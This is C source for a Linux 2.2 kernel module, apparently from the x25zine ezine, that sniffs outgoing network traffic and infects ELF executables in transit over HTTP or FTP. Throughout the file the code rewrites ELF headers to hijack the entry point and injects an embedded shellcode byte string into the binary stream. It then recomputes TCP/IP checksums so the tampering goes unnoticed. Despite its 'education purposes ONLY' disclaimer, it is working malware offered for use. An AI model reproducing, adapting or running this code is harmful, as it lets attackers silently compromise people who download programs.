/* 
 *                        Infection on the fly 
 *
 *                      (c) Free_Hunter // x25zine
 *  
 *  This is ALPHA  code ! for education purposes ONLY !
 *  May cause a kernel panic ;)
 *  Code is very dirty :( i am not leet coder :P
 *  Tested on 2.2.18 kernel and http/ftp protocols with simple ELF files.
 * 
 *  
 *  
 *  
 * based on:
 * krnsniff.c - A kernel based sniffer module by kossak
 * sstrip.c by Brian Raiter                      
 *
 *
 * USAGE: gcc -O2 -DDEBUG -c k.c -I/usr/src/linux/include ; 
 *        insmod infonfly.o [dev=<device>]
 *
 */

#define MODULE
#define __KERNEL__

#include <linux/config.h>
#include <linux/module.h>
#include <linux/version.h>

#include <linux/netdevice.h>
#include <net/protocol.h>
#include <net/pkt_sched.h>
#include <net/tcp.h>
#include <linux/if_ether.h>
#include <linux/ip.h>
#include <linux/tcp.h>
#include <linux/skbuff.h>
#include <linux/byteorder/generic.h>

#include <linux/kernel.h>
#include <linux/mm.h>
#include <linux/file.h>
#include <asm/uaccess.h>

#include <linux/string.h>
#include <linux/errno.h>
#include <linux/unistd.h>
#include <linux/elf.h>
#include <linux/stat.h>
#include <linux/types.h>
#include <asm/elf.h>


/* from a piece of pmsac's code... this is pratic :) */
#define DBGPRN1(X)              if (debug) printk( X)
#define DBGPRN2(X,Y)            if (debug) printk( X, Y);
#define DBGPRN3(X,Y,Z)          if (debug) printk( X, Y, Z);
#define DBGPRN4(X,Y,Z,W)        if (debug) printk( X, Y, Z, W);
#define DBGPRN5(X,Y,Z,W,V)      if (debug) printk( X, Y, Z, W, V);

#define NN2             8192 
//not more 8k between startwrite and newsize

#define Elf_Ehdr        Elf32_Ehdr
#define Elf_Phdr        Elf32_Phdr

#define TRUE  -1
#define FALSE  0

/* global data */
int debug, errno,
    out_c, in_c, thru_c;        /* packet counters */

unsigned int  oldentry;
unsigned long startwrite;
unsigned long sizen,fok=100;
unsigned long newsize,kilo;
char          buftmp[NN2]; 
unsigned long buftmplen=0;
unsigned long tmplen=0;

struct t_data {
        char            content[1500];
        unsigned long   seq;
        unsigned long   dlen;
        struct t_data   *next;
};

struct {
        unsigned short  active;
        unsigned long   saddr;
        unsigned long   daddr;
        unsigned short  sport;
        unsigned short  dport;
        unsigned long   totlen;
        struct t_data   *data;
} victim;

char *dev;
MODULE_PARM(dev, "s");  /* gets the parameter dev=<devname> */
struct device *d;

struct packet_type sniff_proto;

/* inicial function declarations */
char *in_ntoa(__u32 in);
int filter(struct sk_buff *);
void m_strncpy(char *, char *, int); 
void m_strncpyi(char *, char *, int, struct sk_buff *); 
int m_strlen(char *);

void start_victim(struct sk_buff *);
void write_victim(struct sk_buff *);
void end_victim(void);

int readelfheader(Elf_Ehdr *);
int getmemorysize(Elf_Ehdr const *, Elf_Phdr const *, unsigned long *);
int modifyheaders(Elf_Ehdr *, Elf_Phdr *, unsigned long);
int modifyheaders(Elf_Ehdr *, Elf_Phdr *, unsigned long);
int err(char const *);

int err(char const *errmsg)
{
//    printk("%s\n", errmsg);
    return FALSE;
}


int readelfheader(Elf_Ehdr *ehdr)
{
    errno = 0;

    if (!(ehdr->e_ident[EI_MAG0] == ELFMAG0 &&
          ehdr->e_ident[EI_MAG1] == ELFMAG1 &&
          ehdr->e_ident[EI_MAG2] == ELFMAG2 &&
          ehdr->e_ident[EI_MAG3] == ELFMAG3))
        return FALSE;

    if (ehdr->e_ident[EI_DATA] != ELF_DATA)
        return err("ELF file has different endianness.");
    if (ehdr->e_ident[EI_CLASS] != ELF_CLASS)
        return err("ELF file has different word size.");

    if (ehdr->e_machine != ELF_ARCH)
        return err("ELF file created for different architecture.");

    if (ehdr->e_ehsize != sizeof(Elf_Ehdr))
        return err("unrecognized ELF header size.");
    if (ehdr->e_phentsize != sizeof(Elf_Phdr))
        return err("unrecognized program segment header size.");

    if (ehdr->e_type != ET_EXEC)
        return err("not an executable.");

    if (!ehdr->e_phoff || !ehdr->e_phnum)
        return err("ELF file has no program header table.");

    if (ehdr->e_shnum<29)
        return err("ELF file striped.");

    return TRUE;
}

int getmemorysize(Elf_Ehdr const *ehdr, Elf_Phdr const *phdrs,
                         unsigned long *newsize    )
{
    Elf32_Phdr const   *phdr;
    unsigned long       size, n;
    int                 i;

    size = ehdr->e_phoff + ehdr->e_phnum * sizeof *phdrs;
    if (size < sizeof *ehdr)
        size = sizeof *ehdr;

    for (i = 0, phdr = phdrs ; i < ehdr->e_phnum ; ++i, ++phdr) {
        if (phdr->p_type != PT_NULL) {
            n = phdr->p_offset + phdr->p_filesz;
            if (n > size)
                size = n;
        }
    }

    *newsize=size;
    return TRUE;
}


int modifyheaders(Elf_Ehdr *ehdr, Elf_Phdr *phdrs,
                         unsigned long newsize)
{
    Elf32_Phdr *phdr;
    int         i;


    if (ehdr->e_shoff >= newsize) {
        ehdr->e_shoff = 0;
        ehdr->e_shnum = 0;
        ehdr->e_shentsize = 0;
        ehdr->e_shstrndx = 0;
    }

    for (i = 0, phdr = phdrs ; i < ehdr->e_phnum ; ++i, ++phdr) {
        if (phdr->p_offset >= newsize) {
            phdr->p_offset = newsize;
            phdr->p_filesz = 0;
        } else if (phdr->p_offset + phdr->p_filesz > newsize) {
            phdr->p_filesz = newsize - phdr->p_offset;
        }
    }

    phdr = phdrs;
    phdr++;phdr++;
    if ((phdr->p_type == PT_LOAD) && (phdr->p_flags == PF_X | PF_R)){
        startwrite=phdr->p_offset + phdr->p_filesz;
        oldentry = ehdr->e_entry;
        ehdr->e_entry = phdr->p_vaddr + phdr->p_memsz;
        phdr->p_filesz = phdr->p_filesz + 4096;
        phdr->p_memsz = phdr->p_memsz + 4096;
        phdr++;
        for (i = 0; i < (ehdr->e_phnum - 1) ; ++i, ++phdr) {
            if (phdr->p_offset>=startwrite) { 
                 phdr->p_offset = phdr->p_offset + 4096;
                 phdr->p_filesz = phdr->p_filesz-8;
            };
        };
    

    }else{ return FALSE;};
//    printk("old: %4x ehdr: %4x write:%d\n",oldentry,ehdr->e_entry,startwrite);

    

    return TRUE;
}


/* our packet handler */
int pkt_func(struct sk_buff *skb, struct device *dv, struct packet_type *pt) {

        /* fix some pointers */ 
        skb->h.raw = skb->nh.raw + skb->nh.iph->ihl*4;
        skb->data = (unsigned char *)skb->h.raw + (skb->h.th->doff << 2); 
        skb->len -= skb->nh.iph->ihl*4 + (skb->h.th->doff << 2);

        switch (skb->pkt_type) {
                case PACKET_OUTGOING:
                        out_c++;
                        /* dont count with the hardware header 
                         * since my stupid ippp device does not set this...
                         * add more devices here.
                         */
                        if(strstr(dv->name, "ppp")) 
                                skb->len -= 10;
                        else
                                skb->len -= dv->hard_header_len;
                        break;
/*              case PACKET_HOST:
                        in_c++;
                        skb->len -= dv->hard_header_len;
                        break;
                case PACKET_OTHERHOST:
                        thru_c++;
                        skb->len -= dv->hard_header_len;
                        break;
*/
                default:
                        kfree_skb(skb);
                        return 0;
        }
   if(victim.active){
        if(filter(skb)) {
                kfree_skb(skb);
                return 0;
        } 
   };

        if (skb->len){
                write_victim(skb);
        };

        
        kfree_skb(skb);
        return 0;
}

int filter (struct sk_buff *skb) {
/* this is the filter function. it checks if the packet is worth logging */

        struct t_data *ptr, *i;

        int port = FALSE;

        if (skb->nh.iph->protocol != IPPROTO_TCP)
                return TRUE;

//      if (ntohs(skb->h.th->source) == 20) 
//                      port = TRUE;

        if (victim.active) {
                if((skb->h.th->dest != victim.dport) ||
                   (skb->h.th->source != victim.sport) ||
                   (skb->nh.iph->saddr != victim.saddr) ||
                   (skb->nh.iph->daddr != victim.daddr))
                        return TRUE;

        };
        victim.totlen += skb->len;
//      printk("%d\n",skb->len);

        return FALSE;
}

void start_victim(struct sk_buff *skb) {

        victim.active   = TRUE;
        victim.saddr    = skb->nh.iph->saddr;
        victim.daddr    = skb->nh.iph->daddr;
        victim.sport    = skb->h.th->source;
        victim.dport    = skb->h.th->dest;

        victim.data = kmalloc(sizeof(struct t_data), GFP_ATOMIC);
        /* we're a module, we can't afford to crash */
        if(!victim.data) {
                DBGPRN1("Out of memory\n");
                end_victim();
                return;
        }

        victim.data->next = NULL;
        victim.totlen += skb->len;

//      DBGPRN1("Start logging\n");

}


void write_victim(struct sk_buff *skb) {

        struct t_data *ptr, *ptr2, *i;

        struct tcphdr *th;
        struct iphdr *iph;      
        unsigned short size;
        int doff = 0;
        int csum = 0;
        int offset;

        ptr = kmalloc(sizeof(struct t_data), GFP_ATOMIC);
        if(!ptr) {
                DBGPRN1("Out of memory\n");
                end_victim();
                return;
        }

        ptr->next = NULL;
        ptr->seq = ntohl(skb->h.th->seq);
        ptr->dlen = skb->len;
//      printk("%x\n",ptr->seq);        
        m_strncpy(ptr->content, skb->data, skb->len);

/*      
        i = victim.data;

        if(ptr->seq < i->seq) {
                kfree(ptr);
                return;
        };
        while (ptr->seq >= i->seq) {
                if (ptr->seq == i->seq)
                        return;
                if (!i->next)
                        break; 
                if (i->next->seq > ptr->seq)
                        break;
                i = i->next;
        }

        ptr->next = i->next;
        i->next = ptr;

*/

        ptr2 = kmalloc(sizeof(struct t_data), GFP_ATOMIC);
        if(!ptr2) {
                DBGPRN1("Out of memory\n");
                end_victim();
                return;
        }
        ptr2->next = NULL;

        m_strncpy(ptr2->content,skb->data,skb->len);
        m_strncpyi(skb->data,ptr2->content,skb->len,skb);


        th = skb->h.th;
        iph = skb->nh.iph;

        size = ntohs(iph->tot_len) - (iph->ihl * 4);
        doff = th->doff << 2;
 
        /* calculate checksums again... bleh! :P */
        skb->csum = 0;
        csum = csum_partial(skb->h.raw + doff, size - doff, 0);
        skb->csum = csum; /* data checksum */

        th->check = 0;
        th->check = csum_tcpudp_magic(
                iph->saddr,
                iph->daddr,
                size,
                iph->protocol,
                csum_partial(skb->h.raw, doff, skb->csum)
                ); /* tcp or udp checksum */
        ip_send_check(iph); /* ip checksum */

        return;
}

    
void end_victim(void) {
        struct t_data *ptr;
        struct file *file = NULL;
        struct inode *inode;

//      printk("total: %d\n",victim.totlen);
//      printk("No. of entries: %d\n",mycounter);
        
vic_end:
        victim.saddr    = 0;
        victim.daddr    = 0;
        victim.sport    = 0;
        victim.dport    = 0;
        victim.active   = FALSE;
        victim.totlen   = 0;
        victim.data     = NULL;
}


/* trivial but useful functions below. Damn, I miss libc :) */
char *in_ntoa(__u32 in) {
        static char buff[18];
        char *p;

        p = (char *) &in;
        sprintf(buff, "%d.%d.%d.%d",
                (p[0] & 255), (p[1] & 255), (p[2] & 255), (p[3] & 255));
        return(buff);
}

void m_strncpy(char *dest, char *src, int size) {
        char *i, *p;
        p = dest;
        for(i = src; ; i++) {
                if (!size) break;
                size--;

                *p = *i;
                p++;
        }
//      *p = '\0';
}
void m_strncpyi(char *dest, char *src, int size,struct sk_buff *skb) {
        char *i, *p;
    char                *n,*new2;
    Elf_Ehdr            ehdr;
    Elf_Phdr           *phdrs;
    char                buf[size];
    size_t      ssize;
    char sc[]=     
      "\x9C\x60\x6A\x04\x58\x31\xDB\x43\xB9\x01\x80\x04\x08\x6A\x03"
      "\x5A\xCD\x80\x61\x9D\xC3";


    memcpy(buf,src,size);


    if(((n=memchr(buf,0x7f,size))!=NULL) && (victim.active==FALSE)){
        memcpy(&ehdr,n,sizeof ehdr);
        if(readelfheader(&ehdr)){ 
//              printk("readelfheader ok\n");
//              printk("ehdr: %4x\n",ehdr.e_entry);
            n+=sizeof ehdr;
            ssize = ehdr.e_phnum * (sizeof *phdrs);
//                printk("ssize: %d\n",ssize);
            phdrs = kmalloc(ssize, GFP_ATOMIC);
            if(!phdrs) {
                DBGPRN1("Out of memory\n");
                return;
            };
            if ((ssize+(sizeof ehdr))>size-(n-buf)){
//                printk("no full headers data\n");
          
            }
            else{
                memcpy(phdrs,n,ssize);
                getmemorysize(&ehdr, phdrs, &newsize);
                modifyheaders(&ehdr, phdrs, newsize);

                n-=sizeof ehdr;
                memcpy(n,&ehdr,sizeof ehdr);

                n+=sizeof ehdr;
                memcpy(n,phdrs,ssize);

                sizen = newsize-startwrite;
//                      printk("newsize: %d sizen:%d\n",newsize,sizen);
                n-=sizeof ehdr;
                startwrite+=n-buf;
//              printk("new startwrite:%d\n",startwrite);
                if (sizen>NN2){
//                  printk("no place for save good code");
                }
                else{
                  memcpy(src,buf,size);
                  fok=1;
                  start_victim(skb);
                };

            };
     
        };
        
    };

        if (fok==10){
         end_victim();fok=100;
//       printk("end_victim");  
        };
        

        if (fok==5){
            new2 = kmalloc(size, GFP_ATOMIC);
            if(!new2) {
                DBGPRN1("Out of memory\n");
                return;
            };
            memcpy(new2,src,size);

           if (tmplen+size>=sizen){
                memcpy(new2,buftmp+tmplen,sizen-tmplen);
                fok=10;
//              printk("tmpbuf writed ok");     
           }else{
                memcpy(new2,buftmp+tmplen,size);
                tmplen+=size;
//              printk("writing tmpbuf ok");    
           };


            memcpy(src,new2,size);
        };
        
        
        if (fok==2){
           if (kilo+size<4096){
                   kilo+=size;
           }
           else{
            new2 = kmalloc(size, GFP_ATOMIC);
            if(!new2) {
                DBGPRN1("Out of memory\n");
                return;
            };
            memcpy(new2,src,size);
            if ( (4096-kilo+sizen)>size ){
                memcpy(new2+4096-kilo,buftmp,size-(4096-kilo));
                tmplen=size-(4096-kilo);
                fok=5;
//              printk("begin tmpbuf writed");  

            }else{
                memcpy(new2+4096-kilo,buftmp,sizen);
                fok=10;
//              printk("tmpbuf writed ok");     
            };
            memcpy(src,new2,size);
//          printk("fok=2ok kilo:%d\n ",kilo);
           };
                    
        };



        if((victim.totlen>startwrite)&&(fok==0)&&(buftmplen<sizen)){
            new2 = kmalloc(size, GFP_ATOMIC);
            if(!new2) {
                DBGPRN1("Out of memory\n");
                return;
            };
            memcpy(new2,src,size);

            if (size>sizen-buftmplen){
                memcpy(buftmp+buftmplen,new2,sizen-buftmplen);
                kilo=size+buftmplen;
//              printk("fok=2\n");
                buftmplen=sizen;
                fok=2;
//              printk("buftmp save ok");       
            }else{
                if (size<sizen-buftmplen){
                    memcpy(buftmp+buftmplen,new2,size);
                    buftmplen+=size;
                }else{  
                    if (size==sizen-buftmplen){
                            memcpy(buftmp+buftmplen,new2,size);
                            kilo=size+buftmplen;
                            buftmplen+=size;
                            fok=2;
//                          printk("fok=3\n");
                    }   
                };
            };
        };

                                    /*place for shelcode*/
        if((victim.totlen>startwrite+30)&&(fok==1)){
//          printk("fok=0\n");
            fok=0;
            new2 = kmalloc(size, GFP_ATOMIC);
            if(!new2) {
                DBGPRN1("Out of memory\n");
                return;
            };
            memcpy(new2,src,size);
            buftmplen=victim.totlen-startwrite;
            if (buftmplen>sizen) {buftmplen=sizen;
            fok=2;
            kilo=victim.totlen-startwrite;
            };
//          printk("buftmplen %d\n",buftmplen); 
            memcpy(buftmp,new2+(size-(victim.totlen-startwrite)),buftmplen);
            
            
            memcpy(new2+(size-(victim.totlen-startwrite)),"\x68",1);
            memcpy(new2+(size-(victim.totlen-startwrite))+1,&oldentry,4);
            memcpy(new2+(size-(victim.totlen-startwrite))+5,&sc,21);
            memcpy(src,new2,size);
//          printk("writed shellcode ok: %x,%x,%x\n",src[1262],src[1263],src[1264]);
        };

        p = dest;
        for(i = src; ; i++) {
                if (!size) break;
                size--;

                *p = *i;
                p++; 
        }
//      *p = '\0';
}

int m_strlen(char *ptr) {
        int i = 0;
        while (*ptr) {
                ptr++;
                i++;
        }
        return i;
}


/* init_module */
int init_module(void) {

#ifdef DEBUG
        debug = TRUE;
#else
        debug = FALSE;
#endif

        in_c = out_c = thru_c = 0;

        victim.saddr    = 0;
        victim.daddr    = 0;
        victim.sport    = 0;
        victim.dport    = 0;
        victim.active   = FALSE;
        victim.data     = NULL;

        if (dev) {
                d = dev_get(dev);
                if (!d) {
                        DBGPRN2("Did not find device %s!\n", dev);
                        DBGPRN1("Sniffing all known devices...");
                }
                else {
                        DBGPRN3("Sniffing device %s, ifindex: %i\n", 
                                dev, d->ifindex);
                        sniff_proto.dev = d;
                }
        }
        else
                DBGPRN1("Sniffing all known devices...\n");

        sniff_proto.type = htons(ETH_P_ALL);

        /* this one just gets us ip packets */
//      sniff_proto.type = htons(ETH_P_IP); 

        sniff_proto.func = pkt_func;
        dev_add_pack(&sniff_proto);

        return(0);
}

void cleanup_module(void) {
        dev_remove_pack(&sniff_proto);

        DBGPRN4("Statistics: [In: %i] [Out: %i] [Thru: %i]\n",
                in_c, out_c, thru_c);   
        DBGPRN1("Sniffer Unloaded\n");
}

/* EOF */
